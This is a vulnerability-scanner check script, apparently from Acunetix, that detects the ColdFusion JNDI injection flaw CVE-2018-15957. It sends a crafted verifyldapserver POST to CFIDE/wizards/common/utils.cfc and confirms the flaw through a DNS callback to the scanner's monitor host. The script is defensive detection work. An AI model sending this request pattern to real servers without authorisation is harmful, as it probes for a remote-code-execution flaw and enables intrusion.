/**
title: ColdFusion JNDI injection RCE 
tags: coldfusion
description:
    Tests ColdFusion for JNDI injection RCE vulnerability (CVE-2018-15957)
**/

/// <reference path="../../native.d.ts"/>

let flow = ax.loadModule("/lib/utility/flow.js").flow(scanState);
let acumonitor = ax.loadModule("/lib/utility/acumonitor.js");
let rnd = ax.loadModule("/lib/utility/random.js");

// debugging
function trace(msg) {
    ax.log(1, "LOG:" + msg);
}

// alert the vulnerability
function alert(vulnxml, job, acumonitor_data) {
    scanState.addVuln({
        typeId: vulnxml,
        tags: ["verified", "acumonitor", "confidence.100"],
        location: scriptArg.location,
        http: job,
        details: { "acumonitor_data": acumonitor_data },
        detailsType: 1
    });
}

// main function
function main() {

    let vulnxml = 'ColdFusion_JNDI_Inj_RCE.xml';

    let rndToken = acumonitor.signToken('hit' + rnd.randStrDigits(10));
    let ldapValue = rndToken + "." + acumonitor.AMServer;
    let payload = `method=verifyldapserver&vserver=${ldapValue}&vport=9999&vstart=&vusername=&vpassword=&returnformat=json`

    // build from scratch 
    var job = ax.http.job();
    job.setUrl(scriptArg.location.url);
    job.request.method = "POST";
    job.request.uri = job.request.uri + 'CFIDE/wizards/common/utils.cfc';
    job.request.addHeader("Content-Type", "application/x-www-form-urlencoded");
    job.request.body = payload;

    let http = ax.http.execute(job).sync();
    // trace("http " + JSON.stringify(http));

    var result = acumonitor.verifyInjectionDNS(rndToken, ["AAAA", "A"]);

    // check if vulnerable
    if (result) {
        // trace("ALERT!!!!!");
        alert(vulnxml, job, result);
        return true;
    }

}

if (acumonitor.checkAcumonitor(scanState)) { main(); }
